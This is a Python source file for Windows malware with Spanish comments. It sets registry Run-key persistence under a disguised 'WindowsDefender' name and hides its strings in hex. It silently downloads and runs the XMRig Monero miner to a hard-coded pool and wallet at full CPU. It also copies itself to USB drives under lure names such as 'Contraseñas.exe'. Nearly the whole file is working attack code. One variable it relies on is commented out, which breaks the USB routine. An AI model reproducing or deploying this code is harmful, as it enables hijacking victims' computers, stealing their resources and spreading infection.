import os
import sys
import shutil
import subprocess
import time
import ctypes
import winreg
import urllib.request
import random
from getpass import getuser
from zipfile import ZipFile

# ===== CONFIGURACIÓN =====
DEBUG = True
USER = getuser()
APPDATA = os.path.join("C:\\Users", USER, "AppData", "Roaming")
MALWARE_PATH = os.path.join(APPDATA, "WMP.exe")
XM_DIR = os.path.join(APPDATA, "XM")
#INFECTED_USBS = set()  # Trackear USBs ya infectados

def log(msg):
    if DEBUG: print(f"[DEBUG] {msg}")

# ===== FUNCIONES AUXILIARES =====
def decode_str(encoded):
    return bytes.fromhex(encoded).decode()

def is_usb(drive_path):
    try:
        return ctypes.windll.kernel32.GetDriveTypeW(drive_path) == 2
    except:
        return False

def has_internet():
    try:
        urllib.request.urlopen("http://google.com", timeout=3)
        log("Conexión a internet detectada ✓")
        return True
    except:
        log("Sin conexión a internet ✗")
        return False

def is_miner_running():
    try:
        output = subprocess.check_output(
            "tasklist /FI \"IMAGENAME eq xmrig.exe\" /NH", 
            shell=True, 
            stderr=subprocess.DEVNULL
        ).decode().lower()
        return "xmrig.exe" in output
    except:
        return False

# ===== FUNCIONES PRINCIPALES =====
def set_persistence():
    log("\n=== ESTABLECIENDO PERSISTENCIA ===")
    try:
        key_name = decode_str("57696e646f7773446566656e646572")
        key_path = decode_str("536f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e")
        shutil.copyfile(sys.executable, MALWARE_PATH)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, MALWARE_PATH)
        log("Persistencia establecida ✓")
    except Exception as e:
        log(f"Error persistencia: {str(e)}")

def download_xmrig():
    log("\n=== DESCARGANDO XMRIG ===")
    try:
        if os.path.exists(os.path.join(XM_DIR, "xmrig-6.18.0", "xmrig.exe")):
            log("XMRig ya está instalado ✓")
            return True
            
        xmrig_url = decode_str("68747470733a2f2f6769746875622e636f6d2f786d7269672f786d7269672f72656c65617365732f646f776e6c6f61642f76362e31382e302f786d7269672d362e31382e302d6763632d77696e36342e7a6970")
        os.makedirs(XM_DIR, exist_ok=True)
        urllib.request.urlretrieve(xmrig_url, os.path.join(XM_DIR, "xm.zip"))
        
        with ZipFile(os.path.join(XM_DIR, "xm.zip"), 'r') as zip_ref:
            zip_ref.extractall(XM_DIR)
            
        os.remove(os.path.join(XM_DIR, "xm.zip"))
        log("XMRig instalado correctamente ✓")
        return True
    except Exception as e:
        log(f"Error descarga: {str(e)}")
        return False

def is_miner_running():
    try:
        # Usar WMIC para detección precisa
        cmd = 'wmic process where "name=\'xmrig.exe\'" get processid'
        output = subprocess.check_output(cmd, shell=True).decode().lower()
        return "xmrig.exe" in output
    except:
        return False

def run_miner():
    log("\n=== INICIANDO MINERÍA ===")
    if not has_internet():
        log("Abortando: Sin internet ✗")
        return False
        
    if is_miner_running():
        log("Minero ya en ejecución ✓")
        return False
        
    try:
        miner_exe = os.path.join(XM_DIR, "xmrig-6.18.0", "xmrig.exe")
        pool = decode_str("7875722d75732d65617374312e6e616e6f706f6f6c2e6f72673a3134343333")
        wallet = decode_str("34356555466146436d713453486569476a666b6e63665646654754414651745a634259316e62586d505a64636966634253614169374657413453796633636e56634843783936706e5862655673665a4d7531457544754136796d5a723650")
        
        # Configuración optimizada para minería
        args = [
            miner_exe,
            "-o", pool,
            "-u", wallet,
            "--tls",
            "--coin", "monero",
            "--cpu-max-threads-hint=100",
            "--randomx-mode=fast",
            "--donate-level=0",
            "--no-color",
            "--verbose"  # Para depuración
        ]
        
        # Ejecutar sin ocultar la salida (para ver errores)
        process = subprocess.Popen(
            args,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=open(os.path.join(XM_DIR, "xmrig.log"), "w"),  # Log de salida
            stderr=subprocess.STDOUT
        )
        
        # Esperar 10 segundos y verificar si sigue activo
        time.sleep(10)
        if process.poll() is None:
            log("Minero iniciado correctamente ✓")
            return True
        else:
            log("¡El minero se cerró inesperadamente! ✗")
            with open(os.path.join(XM_DIR, "xmrig.log"), "r") as f:
                log(f"Error: {f.read(200)}...")
            return False
            
    except Exception as e:
        log(f"Error minería: {str(e)}")
        return False

def usb_propagation():
    log("\n=== PROPAGACIÓN USB ===")
    names = ["Fotos_Vacaciones.exe", "Documento_Importante.exe", "Regalo.exe", "Contraseñas.exe"]
    
    for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        drive_path = f"{drive}:\\"
        if os.path.exists(drive_path) and is_usb(drive_path) and drive not in INFECTED_USBS:
            try:
                folder = os.path.join(drive_path, "Recursos")
                if any(file.endswith(".exe") for file in os.listdir(folder)):
                    log(f"USB {drive}: ya infectado ✓")
                    INFECTED_USBS.add(drive)
                    continue
                    
                os.makedirs(folder, exist_ok=True)
                target = os.path.join(folder, random.choice(names))
                shutil.copyfile(sys.executable, target)
                INFECTED_USBS.add(drive)
                log(f"Copiado en USB {drive}:\\ como {os.path.basename(target)} ✓")
            except FileNotFoundError:
                pass  # Ignorar si la carpeta no existe
            except Exception as e:
                log(f"Error en {drive}:\\ → {str(e)}")

# ===== EJECUCIÓN =====
if __name__ == "__main__":
    log("\n===== INICIO DEL MALWARE =====")
    set_persistence()
    
    if download_xmrig():
        run_miner()
    else:
        log("¡Falló la instalación de XMRig!")
        
    while True:
        usb_propagation()
        log("\n===== CICLO COMPLETADO =====\n")
        time.sleep(50)  
